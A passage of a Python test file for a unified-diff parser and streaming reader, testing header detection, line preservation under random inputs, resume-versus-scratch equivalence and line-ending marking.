    `---` lines. `--- FAIL: TestX` was a file header (it named a path and no
    hunk was taking lines), the line above it went with the preamble the new
    file threw away, and the lines under it were header lines of a file
    called `FAIL: TestX (0.00s)`. A `---` line with no `+++` line after it
    opens no file now.
    """
    text = "=== RUN   TestX\n--- FAIL: TestX (0.00s)\n    x_test.go:10: bad\nFAIL\n"
    (file,) = Diff.from_unified(text).files
    assert file.dialect == NOT_A_DIFF and file.label == ""
    assert file.raw == tuple(text.splitlines())
    # With a changed line under it, it is a fragment and the `---` line the
    # removal it is everywhere else: still every line, still one unnamed file.
    (file,) = Diff.from_unified(text + "-old\n+new\n").files
    assert file.label == "" and [(r.kind, r.text) for r in file.hunks[0].rows] == [
        (C, "=== RUN   TestX"),
        (R, "-- FAIL: TestX (0.00s)"),
        (C, "   x_test.go:10: bad"),
        (C, "FAIL"),
        (R, "old"),
        (A, "new"),
    ]
    # A real header is two lines, and is read as it was.
    (file,) = Diff.from_unified("--- a/x.py\n+++ b/x.py\n-a\n+b\n").files
    assert file.label == "x.py" and (file.added, file.removed) == (1, 1)


def _key(line: str) -> str:
    """A line as the thing that must be kept of it: less one marker, or a `\\` line's text."""
    if line.startswith("\\"):
        return line[1:].lstrip()
    return line[1:] if line[:1] in ("+", "-", " ") else line


def lines_lost(text: str, diff: Diff) -> list[str]:
    """
    The non-blank lines of `text` that `diff` holds nowhere: not as a row,
    not in a file's `raw`, not in its `header` -- counted, so that the second
    of two equal lines is missed if only one was kept. A line that opened a
    hunk is the hunk (one `@@` line a hunk, and no more than that).
    """
    from collections import Counter

    kept: Counter[str] = Counter()
    hunks = 0
    for file in diff.files:
        kept.update(_key(line) for line in file.raw)
        kept.update(_key(line) for line in file.header)
        hunks += len(file.hunks)
        kept.update(row.text for hunk in file.hunks for row in hunk.rows)
    lost: list[str] = []
    for line in text.split("\n"):
        if not line.strip():
            continue
        key = _key(line) if kept[_key(line)] > 0 else line  # (an unmarked line is its own text)
        if kept[key] > 0:
            kept[key] -= 1
        elif line.startswith("@@") and hunks > 0:
            hunks -= 1
        else:
            lost.append(line)
    return lost


def test_review3_item_6_no_line_of_any_text_is_ever_dropped() -> None:
    """
    The property review 3 asked for: for any text, every line of the input
    is present in rows, raw or header. Texts are random lines of `HOSTILE`
    (so: not diffs, mostly, and full of things that look like the parts of
    one), each read whole, read a character at a time and closed, and looked
    at after every complete line on the way.
    """
    rng = random.Random(6007)
    failures: list[tuple[str, list[str]]] = []
    shapes: set[str] = set()
    for _ in range(600):
        text = "".join(rng.choice(HOSTILE) + "\n" for _ in range(rng.randrange(1, 12)))
        if rng.random() < 0.3:
            text = text[:-1]  # no closing newline
        whole = Diff.from_unified(text)
        shapes.update(f.dialect or ("rows" if f.hunks else "no rows") for f in whole.files)
        lost = lines_lost(text, whole)
        stream = UnifiedDiffStream()
        for at, character in enumerate(text):
            stream.feed(character)
            if character == "\n" and not lost:
                # Mid-stream, the last line or two may be waiting on the next
                # (`Diff.unsettled`, a held `---`): everything before them is kept.
                seen = text[: at + 1]
                missing = lines_lost(seen, stream.diff)
                if missing and missing != seen.rstrip("\n").split("\n")[-len(missing) :]:
                    lost = ["mid-stream:", *missing]
        stream.close()
        if stream.diff != whole:
            lost = ["stream != whole", *lost]
        if lost:
            failures.append((text, lost))
    assert {"rows", NOT_A_DIFF, COMBINED} <= shapes
    assert failures[:3] == [], f"{len(failures)} of 600 texts lose a line"


def test_review3_item_8_a_resumed_derive_equals_a_derive_from_scratch_on_random_streams() -> None:
    """
    The resume point now sits inside an open run of removals, and twice
    while that was being written a fuzz run -- and no test here -- found it
    wrong: the run's pairs were not put back after an add had taken them,
    and a span given to a remove by one pairing outlived it. This is that
    fuzz run, kept: random hunks of short lines that pair with each other,
    fed in pieces of one to five characters, every snapshot's hunks held to
    a derive of the same rows from nothing.
    """
    rng = random.Random(8)
    lines = ["-a", "-b", "-a x", "+a", "+a y", "+c", " k", "\\ No newline at end of file", "-", "+"]
    compared = 0
    for _ in range(400):
        body = "".join(rng.choice(lines) + "\n" for _ in range(rng.randrange(1, 25)))
        text = rng.choice(["@@ -1,40 +1,40 @@\n", "@@\n", "@@ -1,3 +1,3 @@\n"]) + body
        stream = UnifiedDiffStream()
        at = 0
        while at < len(text):
            step = rng.randrange(1, 6)
            stream.feed(text[at : at + step])
            at += step
            for file in stream.diff.files:
                for hunk in file.hunks:
                    compared += 1
                    got = (hunk.side_by_side, hunk.spans, hunk.eol_rows)
                    assert got == _from_scratch(hunk), text[:at]
    assert compared > 5000


def test_review3_item_10_ending_only_rows_are_marked_however_long_the_file() -> None:
    """
    A pair of equal lines costs nothing to compare, and was charged to the
    hunk's intra-line budget all the same: in a file of 6,000 lines converted
    from CRLF the budget ran out and the last 1,000 pairs were not marked as
    differing in their endings (10,000 of 12,000 rows).
    """
    from imscribe.diff import INTRALINE_BUDGET

    count = 6000
    lines = [f"line {i:05d} " + "x" * 29 for i in range(count)]
    assert 2 * sum(map(len, lines)) > INTRALINE_BUDGET  # the premise: past the budget
    (file,) = Diff.from_texts("\r\n".join(lines) + "\r\n", "\n".join(lines) + "\n", "big.txt").files
    assert file.line_endings == "CRLF -> LF"
    assert sum(len(h.eol_rows) for h in file.hunks) == 2 * count
    # And equal pairs leave the budget for the pairs that do need comparing:
    # the one changed line at the very end still gets its spans.
    changed = [*lines[:-1], lines[-1] + " changed"]
    (file,) = Diff.from_texts(
        "\r\n".join(lines) + "\r\n", "\n".join(changed) + "\n", "big.txt"
    ).files
    (hunk,) = file.hunks
    assert len(hunk.eol_rows) == 2 * (count - 1)
    assert hunk.spans[-1] != () and hunk.rows[-1].text.endswith("changed")
